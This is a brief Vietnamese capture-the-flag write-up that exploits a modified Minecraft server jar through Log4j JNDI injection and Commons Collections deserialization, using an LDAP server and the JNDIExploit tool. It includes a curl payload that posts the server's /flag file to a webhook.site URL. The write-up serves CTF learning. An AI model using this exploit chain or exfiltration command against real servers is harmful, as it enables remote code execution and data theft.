# Solution


Bài viết gốc có thể xem tại [đây](https://hackmd.io/@taidh/Bk94PZjt9).

Mình mới học về log4j cách đâu 2 ngày nhưng may thay được dịp gặp được cái chall về nó nên sẽ viết về solution mà chủ yếu từ wu của một đàn anh.

Server cho một file `server_1.15.jar` và để ta có thể dùng `tlauncher` để debug local.
Nhờ vào decription của tác giả ta có thể lên mạng tìm một version khác của nó để check sự khác biệt (mình có tải sẵn ở [đây](mineme\app\server.jar) )

Dùng intellij idea để kiểm tra sự khác nhau của 2 `.jar` file



Ta có thể thấy bên file của đề có sử dụng `collections` và cũng có rất nhiều gadget chain phổ biến với nó. Việc còn lại là set up một ldap server để có thể transer serialized data. Cách này vừa có thể giúp ta khai khác log4j + deserialization vừa bypass được các version mới của jdk. Có thể dùng tool [này](https://github.com/WhiteHSBG/JNDIExploit).


Đầu tiên ta thử ở local với command `calc.exe`




OK giờ thử trên server của giải: `149.28.135.96:13337` với payload: `curl -X POST -d @/flag https://webhook.site/ac119b03-212f-443a-aca6-5e230bfc7544`

Encode payload:



Kết quả:






